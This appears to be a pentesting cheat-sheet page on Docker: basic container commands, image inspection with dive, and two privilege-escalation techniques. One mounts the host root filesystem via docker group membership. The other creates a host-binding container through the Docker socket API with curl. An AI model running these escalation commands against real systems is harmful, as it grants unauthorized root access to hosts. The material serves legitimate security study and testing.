---
title: "Docker"
date: 2024-7-3
tags: ["docker", "privesc", "container", "escape", "dive"]
---

---
### Basic Commands

<div>

```bash
# Show all running processes
sudo docker ps -a
```

```bash
# Show all images
sudo docker images -a
```

```bash
# Stop all processes
sudo docker stop $(sudo docker ps -a -q)
```

```bash
# Remove all processes
sudo docker rm -vf $(sudo docker ps -a -q)
```

```bash
# Remove all images
sudo docker rmi -f $(sudo docker images -aq)
```

```bash
# Shell in docker
sudo docker exec -it <CONTAINER_NAME> sh
```

```bash
# Copy file from host to container
sudo docker cp <HOST_FILE_PATH> <CONTAINER_ID>:<CONTAINER_FILE_PATH>
```

```bash
# Copy file from container to host
sudo docker cp <CONTAINER_ID>:<CONTAINER_FILE_PATH> <HOST_FILE_PATH>
```

```bash
# Copy folder from host to container
sudo docker cp <HOST_FOLDER_PATH>/. <CONTAINER_ID>:<CONTAINER_TARGET_PATH>
```

```bash
# Copy folder from container to host
sudo docker cp <CONTAINER_ID>:<CONTAINER_FOLDER_PATH>/. <HOST_TARGET_PATH>
```

</div>

<br>

---

### Explore Docker image

{{< tab set1 tab1 active >}}dive{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
dive docker-archive://image.tar
```

</div>

<small>*Ref: [dive](https://github.com/wagoodman/dive)*</small>

{{< /tabcontent >}}

<br>

---

### Abuse #1: Docker group

<div>

```bash
# List images
docker images
```

```bash
# Mount host root filesystem
docker run -v /:/mnt -it <IMAGE_NAME> bash
```

```bash
# Check
ls /mnt/root
```

</div>

<br>

---

### Abuse #2: Docker API

<div>

```bash
# Show running containers
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

```bash
# Create container
curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "<IMAGE_NAME>:latest","HostConfig": {"Binds": ["/:/r"]}, "Cmd": ["/bin/sh", "-c", "ls -la /r/root/"], "Tty": true}' --unix-socket /var/run/docker.sock http://localhost/containers/create
```

```bash
# Start container
curl -s -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/<CONTAINER_ID>/start
```

```bash
# Show results
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<CONTAINER_ID>/logs?stderr=1&stdout=1"
```

</div>

<br>